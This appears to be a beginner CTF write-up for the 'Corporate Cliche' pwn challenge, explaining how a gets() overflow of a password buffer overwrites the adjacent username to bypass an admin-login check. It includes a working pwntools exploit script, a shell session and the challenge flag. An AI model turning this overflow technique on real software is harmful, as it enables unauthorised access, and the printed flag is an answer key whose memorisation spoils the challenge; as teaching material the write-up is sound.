---
layout: writeup
title: Corporate Cliche
tags: pwn beginner
---

We are given a binary, some C source code and a remote instance to connect to.

Looking at the source code, our goal is to get the `open_admin_session()` function to run and pop a shell.

We have the credentials hard coded into the app:

{% highlight C %}
const char* logins[][2] = {

    {"admin", "🇦🇩🇲🇮🇳"},

    {"guest", "guest"},

};
{% endhighlight %}

Connecting to the program and logging in with the guest account just brings up a useless email. Trying to login with the username `admin` gives us an error.

```
Enter your username: admin
-> Admin login is disabled. Access denied.
```

Looking back at the source code, after you enter a username, it checks to see if it is `admin` and if so it prints an error and exits. 

{% highlight C %}
    if (strcmp(username, "admin") == 0) {
        printf("-> Admin login is disabled. Access denied.\n");
        exit(0);
    }
{% endhighlight %}

There is a way to bypass this however. If we look at how the `username` and `password` variables are initialised, we can see they are set to a 32 byte buffer, straight after each other in memory

{% highlight C %}
    char password[32];
    char username[32];
{% endhighlight %}

Looking at how the program gets the password, we can see it uses `gets()` which is an insecure function as it allows us to write past the buffer.

{% highlight C %}
    printf("Enter your password: ");
    gets(password);
{% endhighlight %}

This means we overwrite the `username` variable after it checks whether we are trying to login as admin or not. To test this, I connect to the app, type in my username as `guest` and in type `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAadmin` and this bypasses the username check!

```
Enter your username: guest
Enter your password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAadmin
-> Incorrect password for user 'admin'. Access denied.

```

Now all we need to go is make sure the password for admin is entered correctly. The program uses `strcmp()` to check the password which will read a string up to a null terminator (`\x00`).

{% highlight C %}
if (strcmp(password, logins[i][1]) == 0) {
                printf("-> Password correct. Access granted.\n");
                if (strcmp(username, "admin") == 0) {
                    open_admin_session();
                } else {
                    print_email();
                }
{% endhighlight %}

We can use pwntools in Python to create a payload to do this easily.

{% highlight python %}
from pwn import *
from pwn import context

context.binary = './email_server'
context.log_level = "debug"

p = remote("chal.2025.ductf.net", 30000)

p.sendlineafter(b"Enter your username: ", b"guest")

password = "🇦🇩🇲🇮🇳".encode("utf-8")
payload = password + b"\x00"

payload += b"A" * (32 - len(payload))

payload += b"admin\x00"

p.sendlineafter(b"Enter your password: ", payload)

p.interactive()
{% endhighlight %}

This script will enter `guest` as the username, bypassing the username check. It will add the admin password to the payload with a null terminator. It will then pad the of the `password` buffer with `A` characters and finally add the username `admin` to the payload (with a null terminator for good practice).

Once the script has created the payload, it will send it as the password. After running this script, we get a message that we have successfully logged in as `admin` and popped a shell!

```
[*] Switching to interactive mode
[DEBUG] Received 0x51 bytes:
    b'-> Password correct. Access granted.\n'
    b'-> Admin login successful. Opening shell...\n'
-> Password correct. Access granted.
-> Admin login successful. Opening shell...
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x16 bytes:
    b'flag.txt\n'
    b'get-flag\n'
    b'pwn\n'
flag.txt
get-flag
pwn
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x41 bytes:
    b'DUCTF{wow_you_really_boiled_the_ocean_the_shareholders_thankyou}\n'
DUCTF{wow_you_really_boiled_the_ocean_the_shareholders_thankyou}
$
```
